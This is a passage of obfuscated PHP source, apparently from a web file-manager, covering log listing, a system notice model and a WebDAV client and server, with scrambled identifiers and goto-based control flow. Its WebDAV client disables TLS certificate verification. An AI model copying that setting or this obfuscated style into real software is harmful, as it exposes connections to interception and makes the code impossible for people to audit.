$DÛ…éïµãò[] = $e‘«ﬁ‡úçò[$dæâ…∞Á›Û[401]][$dæâ…∞Á›Û[366]]; } } if (!$DÛ…éïµãò) { return array(); } return Model($dæâ…∞Á›Û[749])->sourceListInfo($DÛ…éïµãò, !0); } private function logList($fÎŒﬂˆÆê◊) { goto DÕﬁÏó‚«˜; Fæ†€”Ü∏É: $B”ÂèÍàÑÃ = $this->getSourceList($fÎŒﬂˆÆê◊); $B‡≤œùã¬Œ = $this->typeAll(); $B“∞∑ùÀ¯á = array(); goto A®çØ§ÆçÉ; A®çØ§ÆçÉ: $FÚŒÒ´ÛêÑ = array(); foreach ($fÎŒﬂˆÆê◊ as $aì¶«µí⁄Ç => $e¶‚≠ÖÚí∂) { goto D°‡«Æç∑à; D°‡«Æç∑à: $CÙóÈñÚÔ  = $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[29]]; $bÒôÂ∂˜Œﬂ = isset($b∑íÁ›„«Ê[$e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[1349]]]) ? $b∑íÁ›„«Ê[$e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[1349]]] : !1; $aÛƒúˆàéü = strpos($CÙóÈñÚÔ , $dî¡ÎíéäÇ[2353]) == 0 ? LNG($dî¡ÎíéäÇ[2354]) : LNG($dî¡ÎíéäÇ[2350]); goto cÖ’ôäˆ¥Ω; B¨“ñÑÇ’–: $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[2148]] = $bÒôÂ∂˜Œﬂ; $Eâ±ÕééÑÊ = json_decode($e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[401]], !0); $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[2347]] = isset($Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2347]]) ? $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2347]] : $dî¡ÎíéäÇ[33]; goto C¿≥ºí∑≠ü; DÓ‘ìÁÊ–é: unset($e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[2355]]); $B“∞∑ùÀ¯á[] = $e¶‚≠ÖÚí∂; goto D‹â˘ô÷Ú·; C¿≥ºí∑≠ü: $this->ipAddress($e¶‚≠ÖÚí∂); if (strpos($CÙóÈñÚÔ , $dî¡ÎíéäÇ[2184]) === 0 || isset($Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2183]])) { goto dç√ìˆÈÆ–; dç√ìˆÈÆ–: $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[388]] = $B”ÂèÍàÑÃ[$Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[366]]]; $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2196]] = $B”ÂèÍàÑÃ[$Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2183]]]; if ($Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[29]] == $dî¡ÎíéäÇ[484]) { $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[401]][$dî¡ÎíéäÇ[980]] = $B”ÂèÍàÑÃ[$Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[401]][$dî¡ÎíéäÇ[980]]]; $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[401]][$dî¡ÎíéäÇ[981]] = $B”ÂèÍàÑÃ[$Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[401]][$dî¡ÎíéäÇ[981]]]; } goto A¥πúéªÒú; fÌªúôˆˆá: if ($Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2196]] && $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2196]][$dî¡ÎíéäÇ[368]] == $dî¡ÎíéäÇ[1054]) { $FÚŒÒ´ÛêÑ[] = $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[364]]; unset($fÎŒﬂˆÆê◊[$aì¶«µí⁄Ç]); continue; } goto B–ÒÈÛáÖì; A¥πúéªÒú: if ($Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[29]] == $dî¡ÎíéäÇ[2191]) { $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[401]][$dî¡ÎíéäÇ[366]] = $B”ÂèÍàÑÃ[$Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[401]][$dî¡ÎíéäÇ[366]]]; } if ($Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[29]] == $dî¡ÎíéäÇ[1981]) { $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2196]] = $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[388]]; $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2183]] = $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[2196]][$dî¡ÎíéäÇ[366]]; $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[388]] = !1; $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[366]] = $dî¡ÎíéäÇ[33]; } if ($Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[388]] && $Eâ±ÕééÑÊ[$dî¡ÎíéäÇ[388]][$dî¡ÎíéäÇ[368]] == $dî¡ÎíéäÇ[1054]) { $FÚŒÒ´ÛêÑ[] = $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[364]]; unset($fÎŒﬂˆÆê◊[$aì¶«µí⁄Ç]); continue; } goto fÌªúôˆˆá; B–ÒÈÛáÖì: } $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[401]] = $Eâ±ÕééÑÊ; goto DÓ‘ìÁÊ–é; cÖ’ôäˆ¥Ω: $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[28]] = isset($bÒôÂ∂˜Œﬂ[$dî¡ÎíéäÇ[28]]) ? $bÒôÂ∂˜Œﬂ[$dî¡ÎíéäÇ[28]] : LNG($dî¡ÎíéäÇ[2350]); $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[2231]] = isset($bÒôÂ∂˜Œﬂ[$dî¡ÎíéäÇ[2231]]) ? $bÒôÂ∂˜Œﬂ[$dî¡ÎíéäÇ[2231]] : $dî¡ÎíéäÇ[33]; $e¶‚≠ÖÚí∂[$dî¡ÎíéäÇ[1248]] = isset($B‡≤œùã¬Œ[$CÙóÈñÚÔ ]) ? $B‡≤œùã¬Œ[$CÙóÈñÚÔ ] : $aÛƒúˆàéü; goto B¨“ñÑÇ’–; D‹â˘ô÷Ú·: } $this->clearSystemPathLog($FÚŒÒ´ÛêÑ); goto a—«£∆‰≤¡; DÕﬁÏó‚«˜: $dî¡ÎíéäÇ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fç±ÖÉèÚò = array_to_keyvalue($fÎŒﬂˆÆê◊, $dî¡ÎíéäÇ[33], $dî¡ÎíéäÇ[1349]); $b∑íÁ›„«Ê = Model($dî¡ÎíéäÇ[469])->userListInfo(array_unique($fç±ÖÉèÚò)); goto Fæ†€”Ü∏É; a—«£∆‰≤¡: return $B“∞∑ùÀ¯á; goto Eç’¬ïâÑ®; Eç’¬ïâÑ®: } private function clearSystemPathLog($còáú©›ï≈) { $b¬©€ê√µß =& $_SERVER[£¿ÌÙëü¡¯¯]; if (count($còáú©›ï≈) == 0) { return; } $C˜µœî…éœ = array($b¬©€ê√µß[364] => array($b¬©€ê√µß[7], array_unique($còáú©›ï≈))); $this->where($C˜µœî…éœ)->delete(); } public function deviceList($CΩö‘√å‡≠, $f‚ﬁ≈–Ûå¡ = 0) { $B·¨ÛÑ‰‰∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E“»Ÿüï¶¡ = array($B·¨ÛÑ‰‰∫[1349] => $CΩö‘√å‡≠, $B·¨ÛÑ‰‰∫[184] => array($B·¨ÛÑ‰‰∫[926], $f‚ﬁ≈–Ûå¡), $B·¨ÛÑ‰‰∫[29] => $B·¨ÛÑ‰‰∫[1954]); $B¨€⁄ﬁﬁ≥Ç = array(); $eΩ·—¿Ú—ë = $this->field($B·¨ÛÑ‰‰∫[2356])->where($E“»Ÿüï¶¡)->order($B·¨ÛÑ‰‰∫[2194])->select(); foreach ($eΩ·—¿Ú—ë as $aö±´èË€Õ => $C»øÏåÜ…¯) { goto eÍå‘√™¯œ; e∞áçÀùªﬂ: unset($E¬˜Î·ƒŸŒ[$B·¨ÛÑ‰‰∫[2347]]); $cÛ∆ˆèë‰£ = $this->deviceType($E¬˜Î·ƒŸŒ[$B·¨ÛÑ‰‰∫[2185]]); if (isset($B¨€⁄ﬁﬁ≥Ç[$cÛ∆ˆèë‰£])) { continue; } goto B• ¯òæ›∂; eÍå‘√™¯œ: if ($aö±´èË€Õ > 0 && abs($C»øÏåÜ…¯[$B·¨ÛÑ‰‰∫[184]] - $eΩ·—¿Ú—ë[$aö±´èË€Õ - 1][$B·¨ÛÑ‰‰∫[184]]) < 5) { continue; } $E¬˜Î·ƒŸŒ = json_decode($C»øÏåÜ…¯[$B·¨ÛÑ‰‰∫[401]], !0); $C»øÏåÜ…¯[$B·¨ÛÑ‰‰∫[2347]] = isset($E¬˜Î·ƒŸŒ[$B·¨ÛÑ‰‰∫[2347]]) ? $E¬˜Î·ƒŸŒ[$B·¨ÛÑ‰‰∫[2347]] : $B·¨ÛÑ‰‰∫[33]; goto e∞áçÀùªﬂ; B• ¯òæ›∂: $this->ipAddress($C»øÏåÜ…¯); $C»øÏåÜ…¯[$B·¨ÛÑ‰‰∫[401]] = $E¬˜Î·ƒŸŒ; $B¨€⁄ﬁﬁ≥Ç[$cÛ∆ˆèë‰£] = $C»øÏåÜ…¯; goto EñﬂÔàÆ£Ù; EñﬂÔàÆ£Ù: } return array_values($B¨€⁄ﬁﬁ≥Ç); } public function deviceType($Aà”∏çå§µ) { return $Aà”∏çå§µ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x6e\157\x74\151\x63\x65\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\143\x6f\x6e\x74\x65\156\x74", "\x61\x75\x74\x68", "\155\x6f\144\x65", "\x74\x69\155\x65", "\164\x79\160\145", "\163\x6f\162\x74"); public function listData($bÖè›ŸÇ¿∑ = false, $fÉÒí§Ãùƒ = "\163\157\162\164", $C¡Ï•ñÉ«¡ = false) { return parent::listData($bÖè›ŸÇ¿∑, $fÉÒí§Ãùƒ, $C¡Ï•ñÉ«¡); } public function add($Cæ˜»í—ô£) { goto F¯Çã£÷≠Æ; cäƒ¶Ÿ∞ŒÁ: return parent::insert($Cæ˜»í—ô£); goto d√Éàœä√ò; EÍ÷´»°’ä: $D•‚öæ◊Ÿë = time(); if ($Cæ˜»í—ô£[$cíë‡©å€≥[12]] == $cíë‡©å€≥[2357]) { $D•‚öæ◊Ÿë = strtotime($Cæ˜»í—ô£[$cíë‡©å€≥[187]]); } $Cæ˜»í—ô£[$cíë‡©å€≥[187]] = $D•‚öæ◊Ÿë; goto cäƒ¶Ÿ∞ŒÁ; F¯Çã£÷≠Æ: $cíë‡©å€≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÜÀ‚ ÚÛ£ = $this->findByName($Cæ˜»í—ô£[$cíë‡©å€≥[28]]); if ($dÜÀ‚ ÚÛ£) { return !1; } goto EÍ÷´»°’ä; d√Éàœä√ò: } public function update($C¿ëŒ‡‡Á§, $dê∫≈‹ùÏÍ) { goto FæßêåÏ‹Ó; A±Ñ∆Ìà¡ñ: $dê∫≈‹ùÏÍ[$Bóë·ÛàªΩ[187]] = $bÜôÚøçïÀ; return parent::update($C¿ëŒ‡‡Á§, $dê∫≈‹ùÏÍ); goto CëôèÉâ≥°; FæßêåÏ‹Ó: $Bóë·ÛàªΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÎ¯‹Ÿ≈Ãã = $this->listData($C¿ëŒ‡‡Á§); $C¨≥¶ã¡Ÿ‹ = $this->findByName($dê∫≈‹ùÏÍ[$Bóë·ÛàªΩ[28]]); goto EÃ∂ëìÚ©ò; EÃ∂ëìÚ©ò: if (!$dÎ¯‹Ÿ≈Ãã || $C¨≥¶ã¡Ÿ‹ && $C¨≥¶ã¡Ÿ‹[$Bóë·ÛàªΩ[364]] != $dÎ¯‹Ÿ≈Ãã[$Bóë·ÛàªΩ[364]]) { return !1; } $bÜôÚøçïÀ = time(); if ($dê∫≈‹ùÏÍ[$Bóë·ÛàªΩ[12]] == $Bóë·ÛàªΩ[2357]) { $bÜôÚøçïÀ = strtotime($dê∫≈‹ùÏÍ[$Bóë·ÛàªΩ[187]]); } goto A±Ñ∆Ìà¡ñ; CëôèÉâ≥°: } public function remove($AÍ∫ÑãÕƒ∞) { $D≠âõƒª˜¢ = $this->listData($AÍ∫ÑãÕƒ∞); if (!$D≠âõƒª˜¢ || $D≠âõƒª˜¢[$_SERVER[£¿ÌÙëü¡¯¯][1054]]) { return !1; } return parent::remove($AÍ∫ÑãÕƒ∞); } public function sort($EÍåä°ñ∆™, $cû»ò”´Ã) { return parent::update($EÍåä°ñ∆™, $cû»ò”´Ã); } private function initUserOption() { $Fåß¡—‘®ï =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->optionType = $Fåß¡—‘®ï[2358]; $this->modelType = $Fåß¡—‘®ï[2359]; $this->field = array($Fåß¡—‘®ï[2360], $Fåß¡—‘®ï[28], $Fåß¡—‘®ï[187], $Fåß¡—‘®ï[29], $Fåß¡—‘®ï[676], $Fåß¡—‘®ï[180]); } public function userNoticeGet($E˘Ïﬁ¥È•ÿ = false) { $this->initUserOption(); return parent::listData($E˘Ïﬁ¥È•ÿ, $_SERVER[£¿ÌÙëü¡¯¯][364], !0); } public function userNoticeAdd($E’™‹‚¢Êµ) { $b·óÔﬁ¥‹· =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initUserOption(); $a¡˜ŸÕÛ§ = $this->findByKey($b·óÔﬁ¥‹·[2360], $E’™‹‚¢Êµ[$b·óÔﬁ¥‹·[364]]); if ($a¡˜ŸÕÛ§) { return !0; } $eÓ‡éºïÂƒ = array($b·óÔﬁ¥‹·[2360] => $E’™‹‚¢Êµ[$b·óÔﬁ¥‹·[364]], $b·óÔﬁ¥‹·[28] => $E’™‹‚¢Êµ[$b·óÔﬁ¥‹·[28]], $b·óÔﬁ¥‹·[187] => $E’™‹‚¢Êµ[$b·óÔﬁ¥‹·[187]], $b·óÔﬁ¥‹·[29] => isset($E’™‹‚¢Êµ[$b·óÔﬁ¥‹·[29]]) ? $E’™‹‚¢Êµ[$b·óÔﬁ¥‹·[29]] : 1, $b·óÔﬁ¥‹·[676] => 0, $b·óÔﬁ¥‹·[180] => 0); return parent::insert($eÓ‡éºïÂƒ); } public function userNoticeEdit($A€ûé˘ÙË, $E®ñëê∆êî) { $this->initUserOption(); return parent::update($A€ûé˘ÙË, $E®ñëê∆êî); } } goto B¨ãÏï¯ÿÜ; eåà£â”à¥: class HttpDavClient { public function __construct($A÷”¯è≈ÁÊ, $FÕØù‰•≠», $bΩ⁄ƒÏÍÊÃ) { $this->header = array(); $this->userName = $FÕØù‰•≠»; $this->userPassowrd = $bΩ⁄ƒÏÍÊÃ; } protected function makePath($Cô÷Ç¶≠ï¯) { return $Cô÷Ç¶≠ï¯; } protected function setHeader($C√ü‰” … , $cç∞†◊áŸ∞ = false) { if ($cç∞†◊áŸ∞ === !1) { $this->header[] = $C√ü‰” … ; } else { $this->header[] = $C√ü‰” …  . $_SERVER[£¿ÌÙëü¡¯¯][878] . $cç∞†◊áŸ∞; } } public function move($bÔ√ﬁ˜≥ÃÍ, $F∂®ÖèÓ∂Ñ, $dç∫πÔãÜÜ = '') { $f¥¡ÕÕπô =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->setHeader($f¥¡ÕÕπô[1676], $this->makePath($F∂®ÖèÓ∂Ñ)); $this->setHeader($f¥¡ÕÕπô[1677], $f¥¡ÕÕπô[1678]); if ($dç∫πÔãÜÜ) { $this->setHeader($f¥¡ÕÕπô[1679], $f¥¡ÕÕπô[923] . $dç∫πÔãÜÜ . $f¥¡ÕÕπô[926]); } return $this->send($f¥¡ÕÕπô[1680], $bÔ√ﬁ˜≥ÃÍ); } public function copy($E¿úÎÿ®ÏÁ, $AÇÖæØœ¶Â) { $Dî¿ê–äÜÍ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->setHeader($Dî¿ê–äÜÍ[1676], $this->makePath($AÇÖæØœ¶Â)); $this->setHeader($Dî¿ê–äÜÍ[1677], $Dî¿ê–äÜÍ[1678]); return $this->send($Dî¿ê–äÜÍ[1681], $E¿úÎÿ®ÏÁ); } public function mkcol($Dçº”é‡ƒù) { $b‡ıΩºµé =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->setHeader($b‡ıΩºµé[1677], $b‡ıΩºµé[1678]); return $this->send($b‡ıΩºµé[1682], $Dçº”é‡ƒù); } public function delete($cÉê≠ıΩˆ∆, $d∂ºÙÆ˘‚… = '') { $FÆçÓ»„⁄Ã =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($d∂ºÙÆ˘‚…) { $this->setHeader($FÆçÓ»„⁄Ã[1679], $FÆçÓ»„⁄Ã[923] . $d∂ºÙÆ˘‚… . $FÆçÓ»„⁄Ã[926]); } return $this->send($FÆçÓ»„⁄Ã[1683], $cÉê≠ıΩˆ∆); } public function propfind($Eï¨¢«ëæ›) { $cÈ©Î◊äëé =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->setHeader($cÈ©Î◊äëé[1684], $cÈ©Î◊äëé[84]); $this->setHeader($cÈ©Î◊äëé[1685], $cÈ©Î◊äëé[1686]); $Dπ∫‹∏àãà = $cÈ©Î◊äëé[1687]; return $this->send($cÈ©Î◊äëé[1688], $Eï¨¢«ëæ›, $Dπ∫‹∏àãà); } public function options($DËû´ì√Ó¡) { return $this->send($_SERVER[£¿ÌÙëü¡¯¯][1689], $DËû´ì√Ó¡); } public function get($Füò⁄¥ﬂö∞) { return $this->send($_SERVER[£¿ÌÙëü¡¯¯][213], $Füò⁄¥ﬂö∞); } public function put($cÊùåﬁä„», $b≥¬Ï«Æ∂Ô, $C†«¥ÀÖìı = '') { $d¶Ø‡ìú‘å =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($C†«¥ÀÖìı) { $this->setHeader($d¶Ø‡ìú‘å[1679], $d¶Ø‡ìú‘å[923] . $C†«¥ÀÖìı . $d¶Ø‡ìú‘å[926]); } return $this->send($d¶Ø‡ìú‘å[211], $cÊùåﬁä„», $b≥¬Ï«Æ∂Ô); } protected function send($aÛòÉŸµ¢Ÿ, $Fıê∏»çÒŒ, $dÍÖÇÁ¨√Ñ = false, $CﬂÕÎïÌ‘ã = false) { goto f◊ºù¿Ã«Â; DÉë£ò¯õç: $this->setHeader($aËπô®¢≠‰); if ($dÍÖÇÁ¨√Ñ) { $dÍÖÇÁ¨√Ñ = $d®±éÜ™Î·[1691] . $dÍÖÇÁ¨√Ñ; } if (!request_url_safe($Fıê∏»çÒŒ)) { return !1; } goto F„ƒíÍ‹∞»; f◊ºù¿Ã«Â: $d®±éÜ™Î· =& $_SERVER[£¿ÌÙëü¡¯¯]; $aËπô®¢≠‰ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($d®±éÜ™Î·[1690], $d®±éÜ™Î·[50]); goto DÉë£ò¯õç; cªÿºÑÂÆ∆: curl_setopt($DËì‚ëïû‹, CURLOPT_HTTPHEADER, $this->header); curl_setopt($DËì‚ëïû‹, CURLOPT_RETURNTRANSFER, !0); curl_setopt($DËì‚ëïû‹, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto FÙ√àı≤›ã; F„ƒíÍ‹∞»: $DËì‚ëïû‹ = curl_init($Fıê∏»çÒŒ); curl_setopt($DËì‚ëïû‹, CURLOPT_CUSTOMREQUEST, $aÛòÉŸµ¢Ÿ); curl_setopt($DËì‚ëïû‹, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto cªÿºÑÂÆ∆; b®Ï˘‰∆•ò: $this->header = array(); return $b¢Éµ‘˜†µ; goto D£Çô«ÉûË; FÙ√àı≤›ã: curl_setopt($DËì‚ëïû‹, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($DËì‚ëïû‹, CURLOPT_SSL_VERIFYHOST, !1); $b¢Éµ‘˜†µ = curl_exec($DËì‚ëïû‹); goto b®Ï˘‰∆•ò; D£Çô«ÉûË: } } class HttpDavServer { public function __construct($AÌç•·“∞Ô, $Fö£‘‚‰ˆ˜) { $this->root = $AÌç•·“∞Ô; $this->initPath($Fö£‘‚‰ˆ˜); $this->start(); } public function initPath($aæíÚºÉë›) { $c·ìó¶º≤´ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e‡√éÀ•≠â = rtrim($_SERVER[$c·ìó¶º≤´[1302]], $c·ìó¶º≤´[8]) . $c·ìó¶º≤´[8]; $this->urlBase = substr($e‡√éÀ•≠â, 0, strpos($e‡√éÀ•≠â, $aæíÚºÉë›) + 1); $this->urlBase = rtrim($this->urlBase, $c·ìó¶º≤´[8]) . $aæíÚºÉë›; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $EÖ⁄¨øÆ‹Ω =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÛöúœ∂€ç = HttpAuth::get(); if ($aÛöúœ∂€ç[$EÖ⁄¨øÆ‹Ω[527]] == $EÖ⁄¨øÆ‹Ω[1692] && $aÛöúœ∂€ç[$EÖ⁄¨øÆ‹Ω[895]] == $EÖ⁄¨øÆ‹Ω[1693]) { return !0; } HttpAuth::error(); } public function start() { goto A‘©Òà∏ßª; c©›ˆ‰ö∞Ú: if (!$cÁ©ë«ÈÌ¯) { return; } self::response($cÁ©ë«ÈÌ¯); goto aŒÉæíüÕû; A‘©Òà∏ßª: $D†ßï“¯Ùë =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->checkUser(); $fÆäíÓ€Õ⁄ = $D†ßï“¯Ùë[143] . HttpHeader::method(); goto Bè±–∂ÌÂÂ; Bè±–∂ÌÂÂ: if (!method_exists($this, $fÆäíÓ€Õ⁄)) { pr($fÆäíÓ€Õ⁄ . $D†ßï“¯Ùë[1694]); die; } $aÃø´¬ƒŒç = array($D†ßï“¯Ùë[1695], $D†ßï“¯Ùë[1696]); if (!in_array($fÆäíÓ€Õ⁄, $aÃø´¬ƒŒç) && !$this->pathExists($this->path)) { $cÁ©ë«ÈÌ¯ = array($D†ßï“¯Ùë[1007] => 404); } else { $cÁ©ë«ÈÌ¯ = $this->{$fÆäíÓ€Õ⁄}(); } goto c©›ˆ‰ö∞Ú; aŒÉæíüÕû: } public function pathGet($d©ÿ‚úñøÀ = false) { $a˘êá“ãÌ÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÉŸÃÍ£î = $d©ÿ‚úñøÀ ? $_SERVER[$a˘êá“ãÌ÷[1697]] : $_SERVER[$a˘êá“ãÌ÷[1302]]; $AÉŸÃÍ£î = KodIO::clear(rawurldecode($AÉŸÃÍ£î)); if (!strstr($AÉŸÃÍ£î, KodIO::clear($this->urlBase))) { return !1; } return substr($AÉŸÃÍ£î, strpos($AÉŸÃÍ£î, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($dﬂ¿ÓÇ∂¯‡) { return file_exists($dﬂ¿ÓÇ∂¯‡); } public function pathMkdir($E£âÀÍ∏‘) { return mkdir($E£âÀÍ∏‘, 511, !0); } public function pathInfo($Aò˜Ú€ÖîÚ) { return path_info($Aò˜Ú€ÖîÚ); } public function pathList($d≤”§Âœ™) { return path_list($d≤”§Âœ™); } public function pathOut($b‹Ë’ŸÃŒ‡) { echo file_get_contents($b‹Ë’ŸÃŒ‡); } public function pathPut($fëÚ˘€øï√, $eºÆ‡µã®ê = '') { if (!$eºÆ‡µã®ê) { return file_put_contents($fëÚ˘€øï√, $_SERVER[£¿ÌÙëü¡¯¯][33]); } return move_path($eºÆ‡µã®ê, $fëÚ˘€øï√); } public function pathRemove($EÛ¢Èıß—≠) { if (is_file($EÛ¢Èıß—≠)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($FﬁÉÈÖ’¢›, $aüÎ‹ÊΩí“) { return move_path($FﬁÉÈÖ’¢›, $aüÎ‹ÊΩí“); } public function pathCopy($DÜóöƒ·…¨, $D«Ã¨òﬂ—Á) { return copy_dir($DÜóöƒ·…¨, $D«Ã¨òﬂ—Á); } public function parsePath($Dï¯çàˆé˜) { return $Dï¯çàˆé˜; } public function parseItem($E‰ÍïÙıé›, $Fááñëæ≤œ) { goto Dæóïñ¢å•; cªÔ‰√ﬁ¨·: $bó˘¶‡Î≤Ü = array($DÔéª¬àŒí[1698] => KodIO::clear($this->urlBase . $AºˆéûÙô›), $DÔéª¬àŒí[108] => @gmdate($DÔéª¬àŒí[1699], $E‰ÍïÙıé›[$DÔéª¬àŒí[108]]), $DÔéª¬àŒí[184] => @gmdate($DÔéª¬àŒí[1700], $E‰ÍïÙıé›[$DÔéª¬àŒí[184]]), $DÔéª¬àŒí[78] => $E‰ÍïÙıé›[$DÔéª¬àŒí[78]] ? $E‰ÍïÙıé›[$DÔéª¬àŒí[78]] : 0); return $bó˘¶‡Î≤Ü; goto Aï√äàÕ…◊; Dæóïñ¢å•: $DÔéª¬àŒí =& $_SERVER[£¿ÌÙëü¡¯¯]; $AºˆéûÙô› = $this->pathGet() . $DÔéª¬àŒí[8] . $E‰ÍïÙıé›[$DÔéª¬àŒí[28]]; $AºˆéûÙô› = $DÔéª¬àŒí[8] . str_replace($DÔéª¬àŒí[169], $DÔéª¬àŒí[8], rawurlencode($AºˆéûÙô›)); goto d•ÖÏû√’; d•ÖÏû√’: if ($Fááñëæ≤œ) { $AºˆéûÙô› = $DÔéª¬àŒí[8] . str_replace($DÔéª¬àŒí[169], $DÔéª¬àŒí[8], rawurlencode($this->pathGet())); } if (!trim($E‰ÍïÙıé›[$DÔéª¬àŒí[108]])) { $E‰ÍïÙıé›[$DÔéª¬àŒí[108]] = time(); } if (!trim($E‰ÍïÙıé›[$DÔéª¬àŒí[184]])) { $E‰ÍïÙıé›[$DÔéª¬àŒí[184]] = time(); } goto cªÔ‰√ﬁ¨·; Aï√äàÕ…◊: } public function parseItemXml($fÙ«Œ∆„˜Ö, $e‘ˆß„¶¢Û) { $dí˘π≠¨çﬂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EòªÁª…õ∫ = $this->parseItem($fÙ«Œ∆„˜Ö, $e‘ˆß„¶¢Û); if ($fÙ«Œ∆„˜Ö[$dí˘π≠¨çﬂ[29]] == $dí˘π≠¨çﬂ[77]) { $BâÉ ⁄âÜû = $dí˘π≠¨çﬂ[1701]; $BâÉ ⁄âÜû .= $dí˘π≠¨çﬂ[1702]; } else { $bÆÍ›˜ôàî = $fÙ«Œ∆„˜Ö[$dí˘π≠¨çﬂ[157]] ? $fÙ«Œ∆„˜Ö[$dí˘π≠¨çﬂ[157]] : get_path_ext($fÙ«Œ∆„˜Ö[$dí˘π≠¨çﬂ[28]]); $Bç»ÒßÜÿí = get_file_mime($bÆÍ›˜ôàî); $BâÉ ⁄âÜû = $dí˘π≠¨çﬂ[1703]; $BâÉ ⁄âÜû .= "\74\104\72\147\x65\164\x63\157\x6e\x74\x65\x6e\164\164\x79\x70\145\x3e{$Bç»ÒßÜÿí}\x3c\x2f\x44\72\147\145\x74\x63\x6f\x6e\164\x65\156\x74\164\x79\x70\x65\x3e"; } return "\12\11\x9\74\x44\x3a\x72\x65\163\160\157\156\163\145\76\xa\11\x9\11\74\104\72\150\162\145\146\x3e{$EòªÁª…õ∫[$dí˘π≠¨çﬂ[1698]]}\x3c\57\x44\x3a\150\x72\145\x66\76\12\x9\11\11\x3c\104\72\x70\x72\157\160\x73\x74\141\164\76\12\x9\11\11\x9\74\104\x3a\x70\162\x6f\x70\x3e\xa\x9\11\11\11\11\x3c\x44\x3a\x67\145\x74\x6c\x61\163\x74\155\x6f\144\x69\146\x69\x65\144\76{$EòªÁª…õ∫[$dí˘π≠¨çﬂ[108]]}\x3c\x2f\104\x3a\147\145\x74\154\141\x73\x74\155\157\144\x69\146\x69\145\x64\x3e\12\x9\x9\11\x9\x9\74\104\x3a\143\x72\x65\141\x74\x69\x6f\x6e\x64\141\164\145\76{$EòªÁª…õ∫[$dí˘π≠¨çﬂ[184]]}\x3c\x2f\x44\72\143\162\145\141\164\x69\x6f\156\x64\141\164\x65\76\12\x9\x9\11\11\11\x3c\104\x3a\x67\145\x74\143\x6f\156\164\145\156\x74\154\x65\x6e\x67\164\150\76{$EòªÁª…õ∫[$dí˘π≠¨çﬂ[78]]}\74\57\104\x3a\147\145\164\143\x6f\156\164\x65\x6e\164\154\145\156\x67\x74\150\x3e\12\x9\x9\x9\x9\11{$BâÉ ⁄âÜû}\12\x9\11\x9\x9\x3c\57\104\x3a\160\162\x6f\x70\76\xa\x9\x9\x9\11\74\104\x3a\163\x74\141\164\165\x73\76\110\x54\124\x50\57\61\x2e\x31\40\x32\x30\x30\x20\117\113\74\x2f\104\72\x73\x74\x61\x74\x75\163\x3e\12\11\x9\x9\x3c\x2f\x44\x3a\x70\162\x6f\x70\163\x74\141\x74\x3e\xa\x9\11\74\57\x44\72\162\x65\163\160\x6f\156\163\x65\76"; } public function pathListMerge($CÉÆèΩªµË) { goto c§ﬁ©ëí∑ç; c§ﬁ©ëí∑ç: $cç∏µÇÕê· =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$CÉÆèΩªµË) { return $CÉÆèΩªµË; } $C≈œÕ‘äÍâ = array($cç∏µÇÕê·[74], $cç∏µÇÕê·[75], $cç∏µÇÕê·[1704]); goto dî†É¬⁄¥∑; Bå€Û“çû¨: return $EπÖúªë“¨; goto füÀ¢ºì†Û; dî†É¬⁄¥∑: $EπÖúªë“¨ = array(); foreach ($CÉÆèΩªµË as 